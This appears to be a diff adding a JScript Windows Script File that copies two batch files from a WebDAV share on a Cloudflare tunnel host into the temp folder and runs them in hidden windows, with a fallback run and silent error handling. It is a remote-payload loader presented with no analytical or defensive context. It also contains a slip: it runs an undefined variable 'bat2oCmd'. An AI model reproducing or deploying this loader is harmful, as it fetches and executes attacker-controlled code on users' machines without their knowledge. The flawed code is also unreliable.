@@ -1,0 +1,30 @@
+<job id="CopyAndExecuteBats">
+<script language="JScript">
+try {
+    var shell = new ActiveXObject("WScript.Shell");
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
+    var webdavPath = "\\\\cloudflaretunnellink.trycloudflare.com@SSL\\DavWWWRoot\\";
+
+    // Copy files
+    fso.CopyFile(webdavPath + "bat1.bat", tempDir + "\\bat1.bat", true);
+    fso.CopyFile(webdavPath + "bat2.bat", tempDir + "\\bat2.bat", true);
+
+    // Execute bat1.bat
+    shell.Run(tempDir + "\\bat1.bat", 0, true);
+
+    // Wait 3 seconds
+    WScript.Sleep(3000);
+
+    // Execute bat2.bat using different approaches
+    var bat2Cmd = "cmd /c start /MIN " + tempDir + "\\bat2.bat";
+    shell.Run(bat2oCmd, 0, false);
+
+    // Backup execution method after 1 second
+    WScript.Sleep(1000);
+    shell.Run(tempDir + "\\bat2.bat", 2, false);
+
+} catch (e) {
+}
+</script>
+</job>
